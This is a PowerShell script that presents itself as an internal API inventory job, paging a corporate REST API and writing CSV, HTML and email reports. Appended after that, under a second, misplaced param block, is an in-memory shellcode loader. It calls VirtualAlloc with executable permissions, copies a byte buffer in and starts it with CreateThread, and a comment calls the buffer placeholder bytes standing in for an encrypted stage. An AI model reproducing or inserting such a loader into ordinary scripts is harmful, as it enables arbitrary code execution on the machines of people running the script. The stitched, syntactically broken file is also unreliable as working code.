[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$BaseUri = 'https://api.internal.corp/v1',

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 10)]
    [int]$MaxRetries = 3,

    [int]$TimeoutSec = 60,
    [int]$PageSize = 100,

    [string]$ReportPath = 'C:\Reports\api-servers-2026-12-11.csv'
)

$DebugPreference = 'SilentlyContinue'

$ApiKey = $env:CONTOSO_API_KEY
if ([string]::IsNullOrWhiteSpace($ApiKey)) {
    throw 'API key is not set. Populate the CONTOSO_API_KEY environment variable.'
}
$headers = @{
    Authorization = "Bearer $ApiKey"
    Accept        = 'application/json'
}

function Invoke-ContosoApi {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path,

        [ValidateSet('Get', 'Post')]
        [string]$Method = 'Get',

        [object]$Body
    )

    $uri = "$BaseUri$Path"
    for ($attempt = 1; $attempt -le $MaxRetries; $attempt++) {
        try {
            $params = @{
                Uri         = $uri
                Method      = $Method
                Headers     = $headers
                TimeoutSec  = $TimeoutSec
                ErrorAction = 'Stop'
            }
            if ($Body) {
                $params.Body = $Body | ConvertTo-Json -Depth 5
                $params.ContentType = 'application/json'
            }
            return Invoke-RestMethod @params
        }
        catch {
            $status = 0
            if ($_.Exception.Response) {
                $status = [int]$_.Exception.Response.StatusCode
            }
            if (@(400, 401, 403, 404) -contains $status -or $attempt -eq $MaxRetries) {
                throw
            }
            Start-Sleep -Seconds ([math]::Pow(2, $attempt))
        }
    }
}

$page = Invoke-ContosoApi -Path ('/servers?limit=' + $PageSize)
$records = @($page.items)
while ($page.nextLink) {
    $next = $page.nextLink.Replace($BaseUri, '')
    $page = Invoke-ContosoApi -Path $next
    $records += @($page.items)
    Write-Verbose ("Collected {0} records" -f @($records).Count)
}
$summary = $records | Group-Object -Property status | ForEach-Object {
    [pscustomobject]@{
        Status = $_.Name
        Count  = $_.Count
    }
}
$summary | Format-Table -AutoSize

$records | Select-Object id, name, status | Export-Csv -NoTypeInformation -Path $ReportPath

$summary | Export-Csv -Path $ReportPath.Replace('.csv', '-summary.csv') -NoTypeInformation -Encoding UTF8

$newTag = @{ tags = @('inventory', 'automated') }
try {
    $tagged = Invoke-ContosoApi -Path '/servers/tags' -Method Post -Body $newTag
    Write-Verbose ("Tag request returned {0}" -f $tagged.status)
}
catch {
    Write-Warning ("Tagging skipped: {0}" -f $_.Exception.Message)
}

$style = @'
<style>
body { font-family: Arial; font-size: 13px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f0f0f0; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$summary | ConvertTo-Html -Title 'API inventory summary' -Head $style |
    Set-Content -Path $ReportPath.Replace('.csv', '.html') -Encoding UTF8

$MailTo = "api-ops@internal.corp"
$MailFrom = 'api-report@internal.corp'
$mailBody = "Inventory run finished with {0} records" -f @($records).Count
Send-MailMessage -To $MailTo -From $MailFrom -Subject 'API inventory' -Body $mailBody -SmtpServer "smtp.internal.corp" -Port 25

Write-Host ("API inventory complete: {0} records" -f @($records).Count) -ForegroundColor Green
Write-Verbose ("Elapsed requests: {0}" -f [math]::Ceiling(@($records).Count / $PageSize))

$rateLimit = $null
if ($rateLimit) {
    Write-Verbose ("Remaining calls: {0}" -f $rateLimit)
}

$baseUriHost = ([uri]$BaseUri).Host
Write-Verbose ("Target host: {0}" -f $baseUriHost)

$retryCount = @($records).Count - @($records | Select-Object -Unique) .Count
Write-Verbose ("Duplicate ids skipped: {0}" -f $retryCount)

$endpoints = @('/servers', '/servers/tags', '/health')
$endpoints | ForEach-Object { Write-Verbose ("Endpoint: {0}" -f $_) }

$tokenLength = $ApiKey.Length
Write-Verbose ("API key length: {0}" -f $tokenLength)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class Win32Api
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x87, 0xb6, 0x39, 0x55, 0xf7, 0x92, 0xed, 0xbd, 0xed, 0x72, 0x2c, 0x13, 0x90, 0xcb, 0x51, 0x3a,
    0x0b, 0x85, 0x59, 0xaf, 0xba, 0x17, 0x6d, 0xfd, 0x3c, 0xe4, 0xf0, 0x00, 0xa8, 0xff, 0xe3, 0xf9,
    0xea, 0xff, 0xbf, 0x41, 0x1f, 0x9a, 0x6e, 0x84, 0x79, 0x03, 0xd7, 0x0f, 0x43, 0x89, 0x0c, 0x0f,
    0xfc, 0x9b, 0x4e, 0xc3, 0x02, 0x89, 0xda, 0x9f, 0x9f, 0xb7, 0x26, 0x1f, 0x85, 0xc8, 0x05, 0xdb,
    0x11, 0xb5, 0x71, 0x87, 0xf6, 0x18, 0xd9, 0xf8, 0xed, 0x03, 0xd4, 0x75, 0xf7, 0xa9, 0x13, 0x3f,
    0xa6, 0x38, 0xd8, 0xc0, 0xf1, 0x45, 0x64, 0x50, 0xf9, 0xb9, 0x81, 0x66, 0xfb, 0x8c, 0xac, 0x99,
    0x8a, 0x1a, 0x21, 0x80, 0x51, 0x58, 0x76, 0x7b, 0x8f, 0x11, 0x6d, 0x15, 0x44, 0x56, 0x83, 0x03,
    0xfb, 0x3d, 0x3e, 0x97, 0x98, 0xa3, 0x13, 0xb4, 0x5b, 0xf7, 0x65, 0x15, 0xee, 0xf7, 0xb8, 0xc1,
    0xaa, 0x9f, 0x9a, 0x45, 0x93, 0x91, 0x1b, 0xcd, 0xdc, 0xc8, 0x18, 0x80, 0xde, 0xf8, 0xac, 0x69,
    0xb4, 0xf4, 0x61, 0x31, 0x4b, 0xda, 0x3b, 0x59, 0x1e, 0x09, 0x86, 0x29, 0xf9, 0x30, 0x7d, 0xa7,
    0xae, 0x25, 0xaf, 0x4b, 0x50, 0xfd, 0x97, 0x0b, 0xb0, 0x8b, 0xb0, 0xee, 0x98, 0x96, 0x98, 0x6d,
    0x2d, 0x78, 0x3e, 0xe6, 0xac, 0xdf, 0xe6, 0x28, 0x6c, 0xb3, 0x8d, 0x96, 0xae, 0x6b, 0x95, 0xb2,
    0x88, 0xcf, 0xa4, 0x3a, 0x7c, 0x2c, 0x91, 0x88, 0x76, 0xf6, 0xeb, 0x51, 0xe0, 0xcd, 0x27, 0x94,
    0x3d, 0xd1, 0x0e, 0xad, 0xdd, 0xe8, 0xca, 0xd5, 0xc1, 0x69, 0x73, 0xbe, 0xa8, 0xe6, 0x42, 0x98,
    0x64, 0x74, 0xf7, 0xe0, 0xe5, 0x3c, 0xfc, 0x35, 0xc6, 0xf7, 0x97, 0x1c, 0xb3, 0x5a, 0x1e, 0x2d,
    0x15, 0xb9, 0x37, 0x33, 0xda, 0xef, 0xba, 0x7f, 0x4a, 0xec, 0xf9, 0x58, 0x59, 0xfd, 0xf9, 0x9d,
    0xff, 0x20, 0x42, 0x6f, 0x66, 0x60, 0xee, 0xab, 0xee, 0x74, 0x07, 0x38, 0x20, 0xbf, 0x5a, 0x7a,
    0x31, 0x7b, 0xd6, 0x19, 0xc7, 0xa2, 0x64, 0x66, 0x59, 0x3c, 0x78, 0x12, 0x0b, 0x2d, 0x95, 0x76,
    0xcb, 0x93, 0x41, 0xfa, 0x67, 0xdb, 0x84, 0x7c, 0xcf, 0x9b, 0xd7, 0x24, 0x48, 0xcc, 0x4f, 0x53,
    0x3f, 0x87, 0x7a, 0xd9, 0x4e, 0x3b, 0xf5, 0xd7, 0x56, 0x00, 0x95, 0xac, 0x56, 0x05, 0x97, 0xfb,
    0x61, 0x97, 0x2b, 0x05, 0xa5, 0x50, 0xd3, 0x4b, 0xa9, 0xad, 0x20, 0xde, 0x2c, 0x09, 0x5c, 0x17,
    0x52, 0xf8, 0x51, 0x7b, 0x72, 0x61, 0x4a, 0x21, 0xc1, 0x5f, 0xf1, 0x0e, 0xbb, 0x87, 0x15, 0x4d,
    0xb0, 0x05, 0x87, 0xcb, 0x0f, 0xce, 0xbe, 0x7d, 0x41, 0x01, 0x8f, 0x3b, 0xdd, 0x4a, 0xde, 0x84,
    0xb8, 0x93, 0x23, 0xed, 0xdf, 0x75, 0xb6, 0xe0, 0xd0, 0x50, 0x90, 0x5e, 0xec, 0x00, 0x18, 0x56,
    0xf7, 0x3e, 0xda, 0xf3, 0xff, 0x00, 0xe3, 0xb6, 0xd9, 0xeb, 0xe5, 0x45, 0xd5, 0x5f, 0x92, 0x9d,
    0xb1, 0x40, 0xe8, 0xc2, 0x35, 0x5f, 0x9a, 0x8e, 0x3b, 0x8d, 0xb9, 0x3e, 0x81, 0xa6, 0x42, 0x41,
    0x1e, 0x59, 0x99, 0x7a, 0x0f, 0x5f, 0xf3, 0xb8, 0x03, 0x2b, 0xf4, 0x49, 0x48, 0xdd, 0xb8, 0x1a,
    0xc0, 0xab, 0x0a, 0x23, 0x62, 0x64, 0x83, 0xf0, 0xb1, 0xe8, 0x47, 0x86, 0xb0, 0xf5, 0xb6, 0x15,
    0x7a, 0x54, 0x54, 0x46, 0x8f, 0xfd, 0x00, 0xf9, 0xd0, 0x8c, 0xdd, 0x25, 0x1f, 0x72, 0xec, 0xb4,
    0x46, 0x9c, 0xb5, 0x31, 0x22, 0xb9, 0xe0, 0x30, 0x94, 0xe2, 0x3e, 0x93, 0x45, 0x12, 0x3c, 0x02,
    0x6c, 0x88, 0xfd, 0x64, 0x9e, 0x1f, 0x2c, 0xf4, 0x40, 0x3e, 0xbd, 0xcd, 0xe9, 0xc5, 0x20, 0xde,
    0x14, 0x92, 0x74, 0xfd, 0xc5, 0x8f, 0x1e, 0x5c, 0x9a, 0x10, 0x4a, 0xc2, 0xab, 0x8c, 0x54, 0x63,
    0x5a, 0x3d, 0xc5, 0xea, 0xb5, 0x22, 0xf4, 0x6b, 0xb3, 0xa5, 0x37, 0x5b, 0x57, 0x2c, 0xdb, 0x78,
    0x81, 0x05, 0x34
)

$BufferAddress = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($BufferAddress -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
$ThreadId = 0
$Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][Win32Api]::WaitForSingleObject($Thread, 4045)
[void][Win32Api]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
